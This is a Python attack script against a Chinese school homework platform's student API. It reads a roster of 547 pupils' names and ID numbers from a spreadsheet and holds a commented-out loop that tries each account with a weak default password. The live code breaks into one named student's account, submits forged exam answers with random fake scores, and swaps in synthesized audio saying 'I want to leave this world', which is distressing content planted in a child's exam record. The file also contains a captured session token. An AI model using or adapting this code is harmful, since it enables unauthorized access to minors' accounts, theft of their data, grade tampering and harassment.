# 翼课网登录获取taken
import requests
import hashlib
import json
import urllib.parse  # url编码模块
import xlrd  # 读取Excel表格的库
import xlwt  # 写入Excel表格的库
import sys
import time
import re
import random

path = sys.path[0]
requests.packages.urllib3.disable_warnings()


def write_name(i):
    # 打开表格
    excel = xlrd.open_workbook(r"{}//初三名单.xls".format(path))
    # 输出页签名
    # print(excel.sheet_names())
    # 打开页签
    sheet = excel.sheet_by_name("student")
    nrows = sheet.nrows  # 获取行数
    ncols = sheet.ncols  # 获取列数

    # 取出指定坐标里边的值(行数,列数) 坐标类似列表 从0开始的
    # i 取值1-nrows
    classes = sheet.cell(i, 1).value.replace(" ", "").replace("\n", "").replace("\t", "")  # 身份证
    name = sheet.cell(i, 2).value.replace(" ", "").replace("\n", "").replace("\t", "")  # 姓名

    # c = sheet.cell(i, 1).value  # 初二班级 初一班级直接加100得了
    # numm = sheet.cell(i, 2).value  # 初二学号
    # student = str(int(c) + 100) + str(int(numm))  # 拼接班级学号信息

    # 取出全部
    # for i in range(1, nrows):
    #     result = sheet.cell(i, 6).value.replace(" ", "").replace("/n", "")
    #
    #     print(result)
    print(classes, name)
    return classes, name


# write_name(546)

# 全局请求变量
query_all = "v=3.7&" + \
            "osv=6.0.1&" + \
            "deviceToken=08:00:27:84:05:13&" + \
            "driverType=Google&" + \
            "client=student&" + \
            "os=Android&" + \
            "driverCode=3.9.0&" + \
            "is_http=1&"

header = {
    'Content-Type': 'application/x-www-form-urlencoded',
    "User-Agent": "Mozilla/5.0(Linux;U;Android6.0.1;zh - cn;MuMuBuild/V417IR)AppleWebKit / 534.30(KHTML, likeGecko) Version / 4.0MobileSafari / 534.30",
}


def md5(raw_txt):
    _md5_ = hashlib.md5()
    raw_txt = raw_txt.encode(encoding='utf-8')
    _md5_.update(raw_txt)
    return _md5_.hexdigest()


def str2url(strr):
    # print(str(urllib.parse.quote(strr)))
    return str(urllib.parse.quote(strr))


# 登录
def login(name, pwd):
    login_url = "https://mapi.ekwing.com/student/User/loginschool"
    login_data = query_all + \
                 "pwd=" + md5(pwd) + "&" + \
                 "schoolName=" + str2url("平洲第二初级中学") + "&" + \
                 "schoolId=" + "24203" + "&is_http=1&nicename=" + str2url(name)

    try:
        resp = requests.post(login_url, data=login_data, headers=header, verify=False).json()
        if resp['status'] != 0:
            print("[error]登录已知错误", resp["data"]['error_msg'])
            return "[error]", "[error]"
        else:
            token = resp["data"]['token']
            uid = resp["data"]['uid']
            print("登录成功!")
            return token, uid
    except Exception as e:
        print("[error]登录出现未知错误", e)
        return "[error]", "[error]"


# 获取学生个人信息
def getuserinfoall(token, uid):
    url = "https://mapi.ekwing.com/student/user/getuserinfoall"
    data = query_all + \
           "token=" + token + "&" + \
           "author_id=" + uid + "&" + \
           "uid=" + uid + "&is_http=1"
    try:
        resp = requests.post(url, data=data, headers=header, verify=False).json()
        # print(resp)
        name = resp["data"]["nicename"]
        classes = resp["data"]["classes"]
        vip = resp["data"]["vip"]
        print("{}({}) vip状态:{}".format(classes, name, vip))
        return name, classes, vip
    except Exception as e:
        print("[error]获取学生信息失败!", e)


# 遍历得到仍然使用弱密码的小笨蛋
# for i in range(1, 547):
#     classes, name = write_name(i)
#
#     token, uid = login(name, "666666")
#     if token == "[error]":
#         print("未使用弱密码")
#     else:
#         name, classes, vip = getuserinfoall(token, uid)
#         content = "{}({}) vip状态:{}".format(classes, name, vip)
#         with open(r"{}\\result.txt".format(path), "a") as f:
#             f.write(content + "\n")
#     print("--------------------------------------")
#     time.sleep(1)


# 替换函数
def replace(strr, audioUrl, score):
    time_int = int(time.time())

    pat_score = re.compile(r'"score":"(\d+)"')
    pat_audioUrl = re.compile(r'"audioUrl":"(.*?)"')
    pat_time = re.compile(r'"update_time":(\d+)')

    result_1 = pat_score.sub('"score":"{}"'.format(score), strr)
    result_2 = pat_audioUrl.sub('"audioUrl":"{}"'.format(audioUrl), result_1)
    result_3 = pat_time.sub(r'"update_time":{}'.format(time_int), result_2)

    # print(result_3)

    return result_3


# 输出替换结果
def replace_result():
    # 读单词 替换成 "我想离开这个世界" 成绩为随机85-95
    with open(r"{}//a-1.json".format(path), "r") as f:
        a_1 = f.readlines()[0]
        score_1 = random.randrange(85, 95)
        a_1 = replace(a_1,
                      "https://dds.dui.ai/runtime/v1/synthesize?voiceId=qianranfa&speed=0.8&volume=100&audioType=wav&text=%E6%88%91%E6%83%B3%E7%A6%BB%E5%BC%80%E8%BF%99%E4%B8%AA%E4%B8%96%E7%95%8C",
                      score_1)

    # 朗读课文 替换成<莎士比亚精选> 成绩随机70-75
    with open(r"{}//a-2.json".format(path), "r") as f:
        a_2 = f.readlines()[0]
        score_2 = random.randrange(70, 75)  # 随机数
        a_2 = replace(a_2,
                      "http://music.xf1433.com/up/view.php/36d78225cb1cf65a805e8f944cd03071.mp3",
                      score_2)

    # 听独白回答问题 成绩85-95
    with open(r"{}//a-3.json".format(path), "r") as f:
        a_3 = f.readlines()[0]
        score_3 = random.randrange(85, 95)  # 随机数
        a_3 = replace(a_3,
                      "https://dds.dui.ai/runtime/v1/synthesize?voiceId=qianranfa&speed=0.8&volume=100&audioType=wav&text=%E6%88%91%E6%83%B3%E7%A6%BB%E5%BC%80%E8%BF%99%E4%B8%AA%E4%B8%96%E7%95%8C",
                      score_3)

    # 口头作文 替换成<莎士比亚精选> 成绩60-70
    with open(r"{}//a-4.json".format(path), "r") as f:
        a_4 = f.readlines()[0]
        score_4 = random.randrange(85, 95)  # 随机数
        a_4 = replace(a_4,
                      "http://music.xf1433.com/up/view.php/36d78225cb1cf65a805e8f944cd03071.mp3",
                      score_4)

    return a_1, a_2, a_3, a_4


# # 考试安全验证
# def check_eaxm():
#     timestamp = str(int(time.time()))
#     # url = "https://mapi.ekwing.com/student/exam/getselfstustatus"
#     # data = "token=" + token + \
#     #        "&author_id=" + uid + \
#     #        "&timestamp=" + "1606656209211" + \
#     #        "&uid=" + uid + \
#     #        "&self_id=" + exam_id + "&stu_id=" + uid + "&is_http=1&product=student"
#     url="https://mapi.ekwing.com/student/exam/getselfstustatus?v=3.7&osv=6.0.1&deviceToken=08%3A00%3A27%3A84%3A05%3A13&driverType=MuMu&client=student&os=Android&driverCode=3.9.0&token=eNjc3ODMxNSMjMTA3OTMwMDAzMiMjOGQwZDJkMDdkMWM3YmZiYjBmMWVhZGM4ZmVjMmU5ZGEjI2E0NTIzM2E0YTZlYzg2NGNjZDBjOTA0NDFjMjQ4YWI4IyMxNjA5MjQ5Mjg0IyMyIyMyIyNla3dfc3R1ZGVudA==u&author_id=6778315&timestamp=1606657491292&uid=6778315&self_id=2862853&stu_id=6778315&is_http=1&product=student"
#
#     resp = requests.get(url, headers=header, verify=False).json()
#     print(resp)

# 获取考试界面
def getexamindex(uid, token, exam_id):
    index_url = "https://mapi.ekwing.com/student/exam/basepage?uid=" + uid + \
                "&self_id=" + exam_id + \
                "&product=student&os=Android&driverCode=3.9.0&v=3.7&token=" + token + "&uid=" + uid + "&is_http=1&author_id=" + uid
    resp = requests.get(index_url, verify=False).content.decode(encoding="utf8")
    print(resp)


# token, uid = login("黄国翔", "666666")
# getexamindex(uid, token, "2881073")


# 提交考试
def handineaxm(uid, token, answer_time, answer_info, exam_id):
    headers = {'Host': 'mapi.ekwing.com',
               'Connection': 'keep-alive',
               'Content-Length': '2177',
               'Accept': 'application/json, text/javascript, */*; q=0.01',
               'Origin': 'https://mapi.ekwing.com',
               'X-Requested-With': 'XMLHttpRequest',
               'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0.1; OPPO A57 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.120 MQQBrowser/6.2 TBS/045332 Mobile Safari/537.36',
               'Sec-Fetch-Mode': 'cors',
               'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
               'Sec-Fetch-Site': 'same-origin',
               'Referer': 'https://mapi.ekwing.com/student/exam/loadexamtest?self_id=' + uid + '&self_mode_type=1&type=1&first=&uid=' + uid + '&author_id=' + uid + '&token=' + token + '&v=3.7&is_http=1&os=Android&client=student&driverCode=3.9.0&product=student',
               'Accept-Encoding': 'gzip, deflate, br',
               'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7'}
    # exam_id = "736342"
    exam_url = "https://mapi.ekwing.com/student/exam/saveexamdraft"
    data = query_all + "self_id=" + exam_id + "&" + \
           "answer_info=" + answer_info + "&" + \
           "score_format=100&self_student_status=1&answer_time=" + answer_time + "&uid=" + uid + "&" + \
           "token=" + token
    resp = requests.post(exam_url, data=data, headers=headers, verify=False).json()
    print(resp)


# 提交总考试
def submitexam(uid, token, answer_time, exam_id):
    headers = {'Host': 'mapi.ekwing.com',
               'Connection': 'keep-alive',
               'Content-Length': '2177',
               'Accept': 'application/json, text/javascript, */*; q=0.01',
               'Origin': 'https://mapi.ekwing.com',
               'X-Requested-With': 'XMLHttpRequest',
               'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0.1; OPPO A57 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.120 MQQBrowser/6.2 TBS/045332 Mobile Safari/537.36',
               'Sec-Fetch-Mode': 'cors',
               'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
               'Sec-Fetch-Site': 'same-origin',
               'Referer': 'https://mapi.ekwing.com/student/exam/loadexamtest?self_id=' + uid + '&self_mode_type=1&type=1&first=&uid=' + uid + '&author_id=' + uid + '&token=' + token + '&v=3.7&is_http=1&os=Android&client=student&driverCode=3.9.0&product=student',
               'Accept-Encoding': 'gzip, deflate, br',
               'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7'}
    data = "self_id=" + exam_id + \
           "&answer_time=" + answer_time + \
           "&self_student_status=0&student_version=1&" + \
           "uid=" + uid + \
           "&token=" + token

    submit_url = "https://mapi.ekwing.com/student/exam/submitexam"
    resp = requests.post(submit_url, data=data, headers=headers, verify=False).json()
    print(resp)


exam_id = "2881073"
token, uid = login("刘健", "666666")
if token == "[error]":
    print("未使用弱密码")
else:
    a_1, a_2, a_3, a_4 = replace_result()

    handineaxm(uid, token, "200", a_1, exam_id)
    time.sleep(2)
    handineaxm(uid, token, "300", a_2, exam_id)
    time.sleep(2)
    handineaxm(uid, token, "400", a_3, exam_id)
    time.sleep(2)
    handineaxm(uid, token, "200", a_4, exam_id)
    time.sleep(2)
    submitexam(uid, token, "1100", exam_id)
print("完成")

# 主函数
if __name__ == "__main__":
    while True:
        # 手动替换答题数据叭
        r = input("请输入答题源数据:")
        print("-----------------结果----------------------")
        print(replace(r, "http://music.xf1433.com/up/view.php/36d78225cb1cf65a805e8f944cd03071.mp3", "100"))
        print("------------------end---------------------------")
